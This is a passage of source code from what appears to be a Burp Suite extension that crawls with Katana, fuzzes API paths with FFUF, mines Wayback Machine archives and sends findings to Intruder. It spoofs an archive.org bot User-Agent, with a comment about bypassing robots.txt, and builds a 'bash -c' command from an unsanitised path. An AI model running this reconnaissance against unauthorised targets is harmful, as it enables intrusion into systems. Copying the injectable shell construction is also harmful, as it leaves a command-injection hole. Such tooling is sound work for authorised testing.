                            "response_headers": {},
                            "response_body": "",
                            "response_length": 0,
                            "response_time_ms": 0,
                            "content_type": "unknown",
                            "auth_detected": ["None"],
                            "api_patterns": ["Discovered"],
                            "jwt_detected": None,
                            "encryption_indicators": {
                                "likely_encrypted": False,
                                "types": [],
                            },
                            "param_patterns": {"reflected": [], "param_types": {}},
                        }
                        self.api_data[key] = [entry]
                        self.endpoint_tags[key] = ["katana"]
                        self.endpoint_times[key] = [0]
                        imported += 1
            except Exception as e:
                self._callbacks.printError(
                    "Error importing Katana URL: {}".format(str(e))
                )

        self.katana_area.append(
            "\n[+] Imported {} new endpoints to Recon tab\n".format(imported)
        )
        self.log_to_ui("[+] Imported {} Katana endpoints".format(imported))
        SwingUtilities.invokeLater(
            lambda: self.endpoint_list.getCellRenderer().invalidate_cache()
        )
        SwingUtilities.invokeLater(lambda: self._update_host_filter())
        SwingUtilities.invokeLater(lambda: self._update_stats())
        SwingUtilities.invokeLater(lambda: self.refresh_view())

    def _run_katana(self, event):
        """Run Katana crawler on endpoints from Recon tab"""
        import os
        import subprocess
        import tempfile
        import threading
        import time as time_module

        katana_path = self.katana_path_field.getText().strip()
        if not katana_path:
            self.katana_area.setText("[!] Configure Katana path first\n")
            return
        if not self.api_data:
            self.katana_area.setText(
                "[!] No endpoints in Recon tab. Capture or import first\n"
            )
            return

        # Use temp directory instead of auto-saving
        temp_dir = tempfile.mkdtemp(prefix="burp_katana_")
        urls_file = os.path.join(temp_dir, "urls.txt")

        # Export unique hosts to file with cleaning
        hosts = set()
        with self.lock:
            for entries in self.api_data.values():
                raw_url = self._build_url(self._get_entry(entries), False)
                clean_url = self._clean_url(raw_url)
                if clean_url not in hosts:
                    hosts.add(clean_url)

        writer = None
        try:
            writer = FileWriter(urls_file)
            for host in hosts:
                writer.write(host + "\n")
        finally:
            if writer:
                writer.close()

        self.katana_area.setText("[*] Initializing Katana...\n")
        self.katana_area.append("[*] Targets: {} hosts\n".format(len(hosts)))
        self.log_to_ui("[*] Katana: Starting crawl on {} hosts".format(len(hosts)))

        def run_scan():
            try:
                cmd = [
                    "bash",
                    "-c",
                    "cat {} | {} -d 1 -jc -silent".format(urls_file, katana_path),
                ]
                SwingUtilities.invokeLater(
                    lambda: self.katana_area.append(
                        "[*] Command: {}\n\n".format(" ".join(cmd))
                    )
                )

                start_time = time_module.time()
                process = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=1
                )

                line_count = 0
                last_update = start_time
                results = []
                while True:
                    line = process.stdout.readline()
                    if not line:
                        if process.poll() is not None:
                            break
                        current_time = time_module.time()
                        if current_time - last_update > 2:
                            elapsed = int(current_time - start_time)
                            SwingUtilities.invokeLater(
                                lambda e=elapsed: self.katana_area.append(
                                    "[*] Crawling: {}s...\n".format(e)
                                )
                            )
                            last_update = current_time
                        time_module.sleep(0.1)
                        continue
                    clean_line = re.sub(r"\x1b\[[0-9;]*[mK]", "", line.strip())
                    if clean_line:
                        results.append(clean_line)
                        SwingUtilities.invokeLater(
                            lambda l=clean_line: self.katana_area.append(l + "\n")
                        )
                        line_count += 1

                process.wait()
                elapsed = int(time_module.time() - start_time)

                # Store results in memory only - don't auto-save
                with self.katana_lock:
                    self.katana_discovered = results

                # Categorize results
                api_endpoints = []
                static_files = []
                js_files = []
                css_files = []
                images = []
                other = []

                for url in results:
                    lower = url.lower()
                    if (
                        "/api/" in lower
                        or "/v1/" in lower
                        or "/v2/" in lower
                        or "/v3/" in lower
                    ):
                        api_endpoints.append(url)
                    elif lower.endswith((".js", ".mjs")):
                        js_files.append(url)
                    elif lower.endswith(".css"):
                        css_files.append(url)
                    elif lower.endswith(
                        (".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg", ".ico")
                    ):
                        images.append(url)
                    elif lower.endswith((".html", ".xml", ".json", ".txt")):
                        static_files.append(url)
                    else:
                        other.append(url)

                summary = "\n" + "=" * 80 + "\n"
                summary += "KATANA CRAWL RESULTS\n"
                summary += "=" * 80 + "\n"
                summary += "[*] Crawl Time: {}s\n".format(elapsed)
                summary += "[*] Total Discovered: {} URLs\n".format(len(results))
                summary += "\n"

                # Show breakdown by type
                categories = [
                    ('API Endpoints', api_endpoints),
                    ('JavaScript', js_files),
                    ('Static Files', static_files),
                    ('CSS', css_files),
                    ('Images', images),
                    ('Other', other)
                ]

                for cat_name, cat_list in categories:
                    if cat_list:
                        summary += "=" * 80 + "\n"
                        summary += "{} - {} URLs\n".format(cat_name.upper(), len(cat_list))
                        summary += "=" * 80 + "\n"
                        for url in cat_list[:10]:
                            summary += "{}\n".format(url)
                        if len(cat_list) > 10:
                            summary += "... ({} more)\n".format(len(cat_list) - 10)
                        summary += "\n"

                summary += "=" * 80 + "\n"
                summary += "SUMMARY\n"
                summary += "=" * 80 + "\n"
                for cat_name, cat_list in categories:
                    if cat_list and len(results) > 0:
                        pct = int((len(cat_list) / float(len(results))) * 100)
                        summary += "[+] {}: {} ({}%)\n".format(cat_name, len(cat_list), pct)

                summary += "\n[*] Key Actions:\n"
                if api_endpoints:
                    summary += "    - Review {} API endpoints for security testing\n".format(len(api_endpoints))
                if js_files:
                    summary += "    - Check {} JS files for secrets/API keys\n".format(len(js_files))
                if len(results) > 100:
                    summary += "    - Large attack surface: {} total URLs\n".format(len(results))
                summary += "    - Click 'Import to Recon' to add endpoints\n"
                # Batch both UI updates into single invocation
                log_msg = "[+] Katana: {}s, {} URLs ({} API)".format(
                    elapsed, len(results), len(api_endpoints)
                )
                SwingUtilities.invokeLater(lambda: (
                    self.katana_area.append(summary),
                    self.log_to_ui(log_msg)
                ))
            except Exception as e:
                err = "[!] Error: {}\n".format(str(e))
                SwingUtilities.invokeLater(lambda: self.katana_area.append(err))
                SwingUtilities.invokeLater(
                    lambda: self.log_to_ui("[!] Katana error: {}".format(str(e)))
                )
            finally:
                try:
                    import shutil
                    shutil.rmtree(temp_dir, ignore_errors=True)
                except Exception as e:
                    self._callbacks.printError("Cleanup error: {}".format(str(e)))

        thread = threading.Thread(target=run_scan)
        thread.daemon = True
        thread.start()

    def _export_ffuf_results(self):
        """Export FFUF discovered paths - only saves when user clicks Export"""
        with self.ffuf_lock:
            data = list(self.ffuf_results)
        self._export_list_to_file(data, "FFUF_Export", self.ffuf_area, "results")

    def _send_ffuf_to_intruder(self):
        """Send FFUF results to Burp Intruder"""
        with self.ffuf_lock:
            results = list(self.ffuf_results)
        if not results:
            self.ffuf_area.append("\n[!] No results. Run fuzzer first\n")
            return

        self.ffuf_area.append("\n" + "=" * 80 + "\n")
        self.ffuf_area.append("[*] Sending to Burp Intruder...\n")

        try:
            sent = 0
            for result in results[:10]:
                parts = result.split()
                if len(parts) < 1:
                    continue

                # Try to find URL in FFUF output line
                url = None
                for part in parts:
                    if part.startswith("http://") or part.startswith("https://"):
                        url = part
                        break

                if not url:
                    continue

                parsed = URL(url)
                request = "GET {} HTTP/1.1\r\nHost: {}\r\n\r\n".format(
                    parsed.getPath(), parsed.getHost()
                )

                self._callbacks.sendToIntruder(
                    parsed.getHost(),
                    (
                        parsed.getPort()
                        if parsed.getPort() != -1
                        else (443 if parsed.getProtocol() == "https" else 80)
                    ),
                    parsed.getProtocol() == "https",
                    self._helpers.stringToBytes(request),
                )
                sent += 1

            self.ffuf_area.append("[+] Sent {} requests to Intruder\n".format(sent))
            self.log_to_ui("[+] Sent {} FFUF results to Intruder".format(sent))
        except Exception as e:
            self.ffuf_area.append("[!] Error: {}\n".format(str(e)))
            self.log_to_ui("[!] FFUF Intruder error: {}".format(str(e)))

    def _run_ffuf(self, event):
        """Run FFUF directory fuzzer on endpoints from Recon tab"""
        import os
        import subprocess
        import threading
        import time as time_module

        ffuf_path = self.ffuf_path_field.getText().strip()
        wordlist = self.ffuf_wordlist_field.getText().strip()

        if not ffuf_path:
            self.ffuf_area.setText("[!] Configure FFUF path first\n")
            return

        if not wordlist or not os.path.exists(wordlist):
            self.ffuf_area.setText("[!] Wordlist not found: {}\n".format(wordlist))
            self.ffuf_area.append("[*] Download with: wget -O ~/wordlists/api-endpoints.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints.txt\n")
            return
        if not self.api_data:
            self.ffuf_area.setText(
                "[!] No endpoints in Recon tab. Capture or import first\n"
            )
            return

        # Get API base paths (filter out static resources)
        targets = set()
        skip_paths = ['js', 'css', 'static', 'dist', 'assets', 'images', 'img', 'fonts', 'shreddit', 'recaptcha', 'gsi', 'sw.js', 'service-worker.js']
        with self.lock:
            for entries in self.api_data.values():
                entry = self._get_entry(entries)
                protocol = entry["protocol"]
                host = entry["host"]
                port = (
                    entry["port"]
                    if entry["port"] != -1
                    else (443 if protocol == "https" else 80)
                )
                if (protocol == "https" and port == 443) or (
                    protocol == "http" and port == 80
                ):
                    base = "{}://{}".format(protocol, host)
                else:
                    base = "{}://{}:{}".format(protocol, host, port)

                # Extract API base path and skip static resources
                path = entry.get("normalized_path", "/")
                parts = path.strip("/").split("/")
                if len(parts) > 0 and parts[0]:
                    first_part = parts[0].lower()
                    # Skip static resources and parameterized paths
                    if first_part not in skip_paths and '{id}' not in first_part:
                        targets.add(base + "/" + parts[0] + "/FUZZ")
                else:
                    targets.add(base + "/FUZZ")

        targets = list(targets)

        self.ffuf_area.setText("[*] Initializing FFUF...\n")
        self.ffuf_area.append("[*] Targets: {} (from Recon tab)\n".format(len(targets)))
        # Count wordlist size
        try:
            with open(wordlist, 'r') as f:
                word_count = sum(1 for line in f if line.strip())
            self.ffuf_area.append("[*] Wordlist: {} ({} words)\n".format(wordlist, word_count))
        except Exception:
            self.ffuf_area.append("[*] Wordlist: {}\n".format(wordlist))
        self.ffuf_area.append(
            "[*] Threads: 40, Timeout: 3s, Rate: 100/s, Max: 30s/target\n"
        )
        self.ffuf_area.append(
            "[*] Filtering: Skipping static paths (js, css, images, fonts)\n\n"
        )
        self.log_to_ui("[*] FFUF: {} targets from Recon".format(len(targets)))

        def run_scan():
            try:
                all_matches = []
                total_start = time_module.time()

                # Batch UI update - accumulate messages
                progress_msg = "\n[*] Scanning {} targets...\n\n".format(len(targets))
                SwingUtilities.invokeLater(
                    lambda: self.ffuf_area.append(progress_msg)
                )

                idx = 0
                for target in targets:
                    idx += 1
                    # Only update UI every 5 targets to reduce overhead
                    if idx % 5 == 0 or idx == len(targets):
                        msg = "[*] Target {}/{}: {}\n".format(idx, len(targets), target)
                        SwingUtilities.invokeLater(
                            lambda m=msg: self.ffuf_area.append(m)
                        )

                    start = time_module.time()
                    process = subprocess.Popen(
                        [
                            ffuf_path,
                            "-u",
                            target,
                            "-w",
                            wordlist,
                            "-mc",
                            "200,201,204,301,302,307,401,403,405",
                            "-fc",
                            "404,500,502,503",
                            "-t",
                            "40",
                            "-timeout",
                            "3",
                            "-rate",
                            "100",
                            "-json",
                            "-noninteractive",
                            "-H",
                            "User-Agent: Mozilla/5.0",
                        ],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        bufsize=1,
                    )

                    # Thread-safe output gobbler
                    stdout_lines = []
                    output_lock = threading.Lock()

                    def stream_reader(pipe, output_list, lock=output_lock):
                        try:
                            for line in iter(pipe.readline, ""):
                                if line:
                                    with lock:
                                        output_list.append(line)
                        finally:
                            pipe.close()

                    stdout_thread = threading.Thread(
                        target=stream_reader, args=(process.stdout, stdout_lines)
                    )
                    stdout_thread.daemon = True
                    stdout_thread.start()

                    target_matches = []
                    timeout = 30
                    timed_out = False

                    # Pure timeout loop
                    start_wait = time_module.time()
                    while process.poll() is None:
                        if time_module.time() - start_wait > timeout:
                            timed_out = True
                            try:
                                process.kill()
                                process.wait()
                            except Exception:
                                pass
                            SwingUtilities.invokeLater(
                                lambda: self.ffuf_area.append(
                                    "[!] Timeout after {}s\n".format(timeout)
                                )
                            )
                            break
                        time_module.sleep(0.5)

                    stdout_thread.join(timeout=2)
                    process.wait()

                    # Parse JSON output
                    if not timed_out:
                        with output_lock:
                            lines_snapshot = list(stdout_lines)

                        for line in lines_snapshot:
                            if not isinstance(line, str):
                                try:
                                    line = line.decode("utf-8", errors="ignore")
                                except Exception:
                                    line = str(line)

                            line = line.strip()
                            if not line:
                                continue

                            try:
                                data = json.loads(line)
                                url = data.get("url", "")
                                status = data.get("status", 0)
                                length = data.get("length", 0)

                                if url and status:
                                    result = "[Status: {}] [Length: {}] {}".format(
                                        status, length, url
                                    )
                                    target_matches.append(result)
                                    SwingUtilities.invokeLater(
                                        lambda r=result: self.ffuf_area.append(
                                            "  {}\n".format(r)
                                        )
                                    )
                            except (ValueError, TypeError):
                                pass

                    elapsed = time_module.time() - start
                    all_matches.extend(target_matches)

                    SwingUtilities.invokeLater(
                        lambda e=elapsed, m=len(target_matches): self.ffuf_area.append(
                            "[+] Complete: {:.1f}s | {} matches\n\n".format(e, m)
                        )
                    )

                # Store results
                with self.ffuf_lock:
                    self.ffuf_results = all_matches

                total_elapsed = int(time_module.time() - total_start)

                # Group by status code
                by_status = {}
                for match in all_matches:
                    try:
                        status = match.split('[Status: ')[1].split(']')[0]
                        by_status.setdefault(status, []).append(match)
                    except Exception:
                        by_status.setdefault('unknown', []).append(match)

                summary = "\n" + "=" * 80 + "\n"
                summary += "FFUF SCAN RESULTS\n"
                summary += "=" * 80 + "\n"
                avg_time = float(total_elapsed) / len(targets) if targets else 0
                summary += "[*] Total Time: {}s ({:.1f}s per target)\n".format(total_elapsed, avg_time)
                summary += "[*] Targets Scanned: {}\n".format(len(targets))
                summary += "[*] Total Discoveries: {}\n".format(len(all_matches))
                summary += "\n"

                if all_matches:
                    for status in sorted(by_status.keys()):
                        matches = by_status[status]
                        summary += "=" * 80 + "\n"
                        summary += "STATUS {} - {} paths\n".format(status, len(matches))
                        summary += "=" * 80 + "\n"
                        for match in matches[:10]:
                            summary += "{}\n".format(match)
                        if len(matches) > 10:
                            summary += "... ({} more)\n".format(len(matches) - 10)
                        summary += "\n"

                    summary += "=" * 80 + "\n"
                    summary += "SUMMARY\n"
                    summary += "=" * 80 + "\n"
                    for status in sorted(by_status.keys()):
                        count = len(by_status[status])
                        pct = int((count / float(len(all_matches))) * 100)
                        summary += "[+] Status {}: {} ({}%)\n".format(status, count, pct)
                    summary += "\n[*] Use 'Export Results' to save all discoveries\n"
                else:
                    summary += "[*] No paths discovered\n"

                SwingUtilities.invokeLater(lambda: self.ffuf_area.append(summary))
                SwingUtilities.invokeLater(
                    lambda: self.log_to_ui(
                        "[+] FFUF: {}s, {} targets, {} discoveries".format(
                            total_elapsed, len(targets), len(all_matches)
                        )
                    )
                )
                SwingUtilities.invokeLater(
                    lambda: self.ffuf_area.setCaretPosition(
                        self.ffuf_area.getDocument().getLength()
                    )
                )
            except Exception as e:
                err = "[!] Error: {}\n".format(str(e))
                SwingUtilities.invokeLater(lambda: self.ffuf_area.append(err))
                SwingUtilities.invokeLater(
                    lambda: self.log_to_ui("[!] FFUF error: {}".format(str(e)))
                )

        thread = threading.Thread(target=run_scan)
        thread.daemon = True
        thread.start()

    def _run_wayback(self):
        """Discover historical endpoints using Wayback Machine API"""
        import threading
        import time as time_module

        if not self.api_data:
            self.wayback_area.setText(
                "[!] No endpoints in Recon tab. Capture or import first\n"
            )
            return

        # Get unique hosts and paths with smart filtering
        hosts = set()
        paths = set()
        skip_patterns = [
            ".googleusercontent.com", ".gstatic.com", ".redditmedia.com",
            ".cdn-apple.com", "ingest.sentry.io", ".fastly-edge.com"
        ]

        with self.lock:
            for entries in self.api_data.values():
                entry = self._get_entry(entries)
                host = entry.get("host")
                if not host:
                    continue

                # Skip CDN/static hosts
                if any(pattern in host for pattern in skip_patterns):
                    continue

                hosts.add(host)
                # Add base paths like /api, /v1, /admin
                path = entry.get("path")
                if path and path != "/":
                    if not path.startswith("/"):
                        path = "/" + path
                    parts = [p for p in path.split("/") if p]
                    if parts:
                        base_path = "/" + parts[0]
                        # Skip static/common paths
                        if base_path not in ["/favicon.ico", "/robots.txt", "/static", "/dist", "/css", "/js"]:
                            paths.add((host, base_path))

        # Get date range and limit from UI with validation
        current_year = str(time.localtime().tm_year)
        from_year = self.wayback_from_field.getText().strip() or "2020"
        to_year = self.wayback_to_field.getText().strip() or current_year
        limit = self.wayback_limit_field.getText().strip() or "100"

        # Validate inputs
        try:
            from_year_int = int(from_year)
            to_year_int = int(to_year)
            limit_int = int(limit)
            current_year_int = int(current_year)
            if from_year_int < 1996 or from_year_int > current_year_int:
                from_year = "2020"
            if to_year_int < 1996 or to_year_int > current_year_int:
                to_year = current_year
            if limit_int < 1 or limit_int > 1000:
                limit = "100"
        except ValueError:
            from_year = "2020"
            to_year = current_year
            limit = "100"

        # Combine hosts and paths for queries
        queries = [(h, "") for h in hosts]
        queries.extend([(h, p) for h, p in paths])

        if not queries:
            self.wayback_area.setText("[!] No hosts found in Recon tab\n")
            return

        self.wayback_area.setText("[*] Querying Wayback Machine...\n")
        self.wayback_area.append(
            "[*] Targets: {} hosts + {} paths\n".format(len(hosts), len(paths))
        )
        self.wayback_area.append("[*] Date Range: {}-{}\n".format(from_year, to_year))
        self.wayback_area.append("[*] Limit: {} per target\n\n".format(limit))
        self.log_to_ui(
            "[*] Wayback: {} queries ({}-{})".format(len(queries), from_year, to_year)
        )

        def run_discovery():
            try:
                import json

                import urllib2  # type: ignore

                all_urls = []
                seen_urls = set()
                start_time = time_module.time()
                error_count = 0
                backoff_time = 3.0  # Start with 3s delay

                idx = 0
                for host, path in queries:
                    idx += 1
                    target = host + path if path else host
                    SwingUtilities.invokeLater(
                        lambda t=target, i=idx, total=len(queries): self.wayback_area.append(
                            "[*] {}/{}: {}\n".format(i, total, t)
                        )
                    )

                    # Retry logic with exponential backoff
                    max_retries = 2
                    retry_delay = 2
                    success = False
                    data = None

                    try:
                        for attempt in range(max_retries + 1):
                            try:
                                # Query Wayback CDX API with date range
                                match_type = "prefix" if path else "domain"
                                api_url = "http://web.archive.org/cdx/search/cdx?url={}&matchType={}&output=json&filter=statuscode:200&collapse=urlkey&from={}&to={}&limit={}".format(
                                    target, match_type, from_year, to_year, limit
                                )

                                # Create request with proper headers to bypass robots.txt
                                request = urllib2.Request(api_url)
                                request.add_header('User-Agent', 'Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)')
                                request.add_header('Accept', 'application/json')

                                response = None
                                try:
                                    response = urllib2.urlopen(request, timeout=20)
                                    data = json.loads(response.read())
                                    success = True
                                except urllib2.HTTPError as http_err:
                                    if http_err.code == 403:
                                        raise Exception(  # noqa: B904
                                            "HTTP Error 403: FORBIDDEN (blocked by robots.txt)"
                                        )
                                    elif http_err.code == 429:
                                        if attempt < max_retries:
                                            time_module.sleep(retry_delay * (2 ** attempt))
                                            continue
                                        raise Exception(  # noqa: B904
                                            "HTTP Error 429: Too Many Requests"
                                        )
                                    else:
                                        raise Exception(  # noqa: B904
                                            "HTTP Error {}: {}".format(
                                                http_err.code, http_err.reason
                                            )
                                        )
                                except urllib2.URLError as url_err:
                                    if "timed out" in str(url_err).lower():
                                        if attempt < max_retries:
                                            time_module.sleep(retry_delay)
                                            continue
                                        raise Exception(  # noqa: B904
                                            "Timeout after {} retries".format(max_retries)
                                        )
                                    raise Exception("Network error: {}".format(str(url_err)))  # noqa: B904
                                finally:
                                    if response:
                                        response.close()

                                if success:
                                    break
                            except Exception:
                                if attempt == max_retries:
                                    raise
                                time_module.sleep(retry_delay)
                    except Exception as e:
                        err_msg = str(e)
                        SwingUtilities.invokeLater(
                            lambda err=err_msg: self.wayback_area.append(
                                "  [!] Error: {}\n".format(err)
                            )
                        )
                        error_count += 1
                        if "429" in err_msg or "Too Many Requests" in err_msg:
                            backoff_time = min(backoff_time * 2, 60.0)
                            time_module.sleep(backoff_time)
                        continue

                    try:
                        if success and data and len(data) > 1:  # First row is headers
                            found_count = 0
                            for row in data[1:]:  # Skip header row
                                if len(row) >= 3:
                                    original_url = row[2]  # Original URL
                                    timestamp = row[1]  # Timestamp
                                    snapshot_url = (
                                        "http://web.archive.org/web/{}/{}".format(
                                            timestamp, original_url
                                        )
                                    )

                                    # Deduplicate by original URL
                                    if original_url not in seen_urls:
                                        seen_urls.add(original_url)
                                        all_urls.append(
                                            "{} | {} | {}".format(
                                                original_url, snapshot_url, timestamp
                                            )
                                        )
                                        found_count += 1

                            if found_count > 0:
                                SwingUtilities.invokeLater(
                                    lambda c=found_count: self.wayback_area.append(
                                        "  [+] Found: {} snapshots\n".format(c)
                                    )
                                )
                            else:
                                SwingUtilities.invokeLater(
                                    lambda: self.wayback_area.append(
                                        "  [-] No unique archives\n"
                                    )
                                )
                        else:
                            SwingUtilities.invokeLater(
                                lambda: self.wayback_area.append(
                                    "  [-] No archive found\n"
                                )
                            )
                    except Exception as parse_err:
                        err_msg = str(parse_err)
                        SwingUtilities.invokeLater(
                            lambda err=err_msg: self.wayback_area.append(
                                "  [!] Parse error: {}\n".format(err)
                            )
                        )
                        self._callbacks.printError("Wayback parse error: {}".format(err_msg))

                    # Reset error tracking on success
                    error_count = 0
                    backoff_time = 3.0
                    time_module.sleep(4.0)  # 15 req/min (safe rate limiting)

                elapsed = int(time_module.time() - start_time)

                # Store results
                with self.wayback_lock:
                    self.wayback_discovered = all_urls

                summary = "\n" + "=" * 80 + "\n"
                summary += "WAYBACK DISCOVERY RESULTS\n"
                summary += "=" * 80 + "\n"
                summary += "[*] Query Time: {}s (~{}min)\n".format(elapsed, elapsed // 60)
                summary += "[*] Queries: {} (hosts + paths)\n".format(len(queries))
                summary += "[*] Snapshots Found: {}\n".format(len(all_urls))
                summary += "[*] Success Rate: {}%\n".format(
                    int((len(queries) - error_count) * 100.0 / len(queries)) if len(queries) > 0 else 0
                )
                summary += "\n"

                if all_urls:
                    # Score and sort snapshots by relevance
                    scored_urls = []
                    for url in all_urls:
                        score = 0
                        url_lower = url.lower()
                        # Prioritize API endpoints
                        if '/api/' in url_lower: score += 10
                        if any(v in url_lower for v in ['/v1/', '/v2/', '/v3/']): score += 5
                        # Deprioritize static files
                        if any(ext in url_lower for ext in ['.js', '.css', '.png', '.jpg']): score -= 5
                        scored_urls.append((score, url))

                    scored_urls.sort(reverse=True, key=lambda x: x[0])

                    summary += "=" * 80 + "\n"
                    summary += "DISCOVERED API ENDPOINTS\n"
                    summary += "=" * 80 + "\n"
                    # Extract and filter API endpoints
                    api_endpoints_list = []
                    for _, url_entry in scored_urls:
                        try:
                            original_url = url_entry.split(" | ")[0]
                            if not original_url.startswith("http"):
                                original_url = "http://" + original_url
                            parsed = URL(original_url)
                            path = parsed.getPath() or "/"
                            # Only include API endpoints
                            if any(p in path.lower() for p in ['/api/', '/v1/', '/v2/', '/v3/', '/graphql', '/rest/']):
                                endpoint = "{}://{}{}".format(parsed.getProtocol(), parsed.getHost(), path)
                                if parsed.getQuery():
                                    query = parsed.getQuery()
                                    # Skip search/query noise
                                    if not any(n in query.lower() for n in ['?q=', 'rdt=', 'search=']):
                                        endpoint += "?" + query
                                # Skip noise patterns
                                if not any(n in endpoint.lower() for n in ['/r/$', '?rdt=']):
                                    api_endpoints_list.append(endpoint)
                        except Exception:
                            continue
                    
                    # Deduplicate and sort
                    api_endpoints_list = sorted(set(api_endpoints_list))
                    for endpoint in api_endpoints_list[:50]:
                        summary += "{}\n".format(endpoint)
                    if len(api_endpoints_list) > 50:
                        summary += "... ({} more)\n".format(len(api_endpoints_list) - 50)
                    summary += "\n"

                    summary += "=" * 80 + "\n"
                    summary += "SUMMARY\n"
                    summary += "=" * 80 + "\n"
                    summary += "[+] Total Snapshots: {}\n".format(len(all_urls))
                    summary += "[+] Filtered API Endpoints: {}\n\n".format(len(api_endpoints_list))

                    summary += "[*] Key Actions:\n"
                    summary += "    - Click 'Send to Recon' to add discovered endpoints\n"
                    summary += "    - Review snapshots for deprecated/forgotten endpoints\n"
                    summary += "    - Export results for manual analysis\n"
                else:
                    summary += "[*] No snapshots found\n"
                    summary += "[*] Try expanding date range or checking different hosts\n"

                SwingUtilities.invokeLater(lambda: self.wayback_area.append(summary))
                SwingUtilities.invokeLater(
                    lambda: self.log_to_ui(
                        "[+] Wayback: {}s, {} archives".format(elapsed, len(all_urls))
                    )
                )
            except Exception as e:
                err = "[!] Error: {}\n".format(str(e))
                SwingUtilities.invokeLater(lambda: self.wayback_area.append(err))
                SwingUtilities.invokeLater(
                    lambda: self.log_to_ui("[!] Wayback error: {}".format(str(e)))
                )

        thread = threading.Thread(target=run_discovery)
        thread.daemon = True
        thread.start()

    def _export_wayback_results(self):
        """Export Wayback discovered snapshots to JSON, TXT, and endpoints list"""
        import os

        with self.wayback_lock:
            data = list(self.wayback_discovered)

        if not data:
            self.wayback_area.append("\n[!] No snapshots to export\n")
            return

        export_dir = self._get_export_dir("Wayback_Export")
        if not export_dir:
            return

        json_file = os.path.join(export_dir, "wayback_results.json")
        txt_file = os.path.join(export_dir, "wayback_urls.txt")
        endpoints_file = os.path.join(export_dir, "discovered_endpoints.txt")

        # Parse and structure data
        structured = []
        unique_endpoints = set()
        for entry in data:
            parts = entry.split(" | ")
            if len(parts) >= 3:
                original_url = parts[0]
                structured.append({
                    "original_url": original_url,
                    "archive_url": parts[1],
                    "timestamp": parts[2],
                    "score": self._score_wayback_url(original_url)
                })
                # Extract unique endpoint
                try:
                    if not original_url.startswith("http"):
                        original_url = "http://" + original_url
                    parsed = URL(original_url)
                    endpoint = "{}://{}{}".format(parsed.getProtocol(), parsed.getHost(), parsed.getPath() or "/")
                    if parsed.getQuery():
                        endpoint += "?" + parsed.getQuery()
                    unique_endpoints.add(endpoint)
                except Exception:
                    pass

        structured.sort(key=lambda x: x["score"], reverse=True)

        export_data = {
            "metadata": {
                "total_snapshots": len(structured),
                "unique_endpoints": len(unique_endpoints),
                "api_endpoints": sum(1 for s in structured if s["score"] >= 10),
                "export_time": SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Date())
            },
            "snapshots": structured,
            "unique_endpoints": sorted(unique_endpoints)
        }

        writer = None
        try:
            writer = FileWriter(json_file)
            writer.write(json.dumps(export_data, indent=2))
            writer.close()

            writer = FileWriter(txt_file)
            for item in structured:
                writer.write(item["original_url"] + "\n")
            writer.close()

            writer = FileWriter(endpoints_file)
            filtered_endpoints = []
            for endpoint in sorted(unique_endpoints):
                ep_lower = endpoint.lower()
                # Filter useful API endpoints only
                if any(pattern in ep_lower for pattern in ['/api/', '/v1/', '/v2/', '/v3/', '/graphql', '/rest/']):
                    # Skip noise
                    if not any(noise in ep_lower for noise in ['?q=', '?rdt=', '/r/$', 'search', 'query']):
                        filtered_endpoints.append(endpoint)
                        writer.write(endpoint + "\n")
            writer.close()
            
            # Update metadata
            export_data["metadata"]["filtered_endpoints"] = len(filtered_endpoints)

            api_count = export_data["metadata"]["api_endpoints"]
            filtered_count = export_data["metadata"].get("filtered_endpoints", 0)
            self.wayback_area.append("\n[+] Exported {} snapshots\n".format(len(data)))
            self.wayback_area.append("[+] Unique Endpoints: {}\n".format(len(unique_endpoints)))
            self.wayback_area.append("[+] Filtered API Endpoints: {}\n".format(filtered_count))
            self.wayback_area.append("[+] JSON: {}\n".format(json_file))
            self.wayback_area.append("[+] URLs: {}\n".format(txt_file))
            self.wayback_area.append("[+] Endpoints: {}\n".format(endpoints_file))
            self.wayback_area.append("[+] Folder: {}\n".format(export_dir))
            self.log_to_ui("[+] Wayback export: {} endpoints".format(len(unique_endpoints)))
        except Exception as e:
            self.wayback_area.append("\n[!] Export failed: {}\n".format(str(e)))
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as close_err:
                    self._callbacks.printError(
                        "Error closing wayback export file: {}".format(str(close_err))
                    )

    def _score_wayback_url(self, url):
        """Score URL by relevance for prioritization"""
        score = 0
        url_lower = url.lower()
        if '/api/' in url_lower:
            score += 10
        if any(v in url_lower for v in ['/v1/', '/v2/', '/v3/']):
            score += 5
        if any(ext in url_lower for ext in ['.js', '.css', '.png', '.jpg']):
            score -= 5
        return score

    def _import_wayback_to_recon(self):
        """Send Wayback snapshots to Recon tab"""
        with self.wayback_lock:
            snapshots = list(self.wayback_discovered)
        if not snapshots:
            self.wayback_area.append(
                "\n[!] No snapshots discovered. Run discovery first\n"
            )
            return

        self.wayback_area.append("\n[*] Sending snapshots to Recon tab...\n")
        imported = 0
        skipped = 0
        for snapshot in snapshots:
            try:
                parts = snapshot.split(" | ")
                if len(parts) < 1:
                    continue
                original_url = parts[0]

                # Ensure URL has protocol
                if not original_url.startswith(
                    "http://"
                ) and not original_url.startswith("https://"):
                    original_url = "http://" + original_url

                parsed = URL(original_url)
                method = "GET"
                path = parsed.getPath() or "/"
                normalized = self._normalize_path(path)
                key = "{}:{}".format(method, normalized)

                with self.lock:
                    if key not in self.api_data:
                        protocol = parsed.getProtocol() or "http"
                        port = parsed.getPort()
                        if port == -1:
                            port = 443 if protocol == "https" else 80

                        entry = {
                            "method": method,
                            "path": path,
                            "normalized_path": normalized,
                            "host": parsed.getHost(),
                            "protocol": protocol,
                            "port": port,
                            "query_string": parsed.getQuery() or "",
                            "parameters": {
                                "url": {},
                                "body": {},
                                "cookie": {},
                                "json": {},
                            },
                            "headers": {},
                            "request_body": "",
                            "response_status": 200,
                            "response_headers": {},
                            "response_body": "",
                            "response_length": 0,
                            "response_time_ms": 0,
                            "content_type": "unknown",
                            "auth_detected": ["None"],
                            "api_patterns": ["Wayback"],
                            "jwt_detected": None,
                            "encryption_indicators": {
                                "likely_encrypted": False,
                                "types": [],
                            },
                            "param_patterns": {"reflected": [], "param_types": {}},
                        }
                        self.api_data[key] = [entry]
                        self.endpoint_tags[key] = ["wayback", "historical"]
                        self.endpoint_times[key] = [0]
                        imported += 1
                    else:
                        skipped += 1
            except Exception as e:
                self._callbacks.printError(
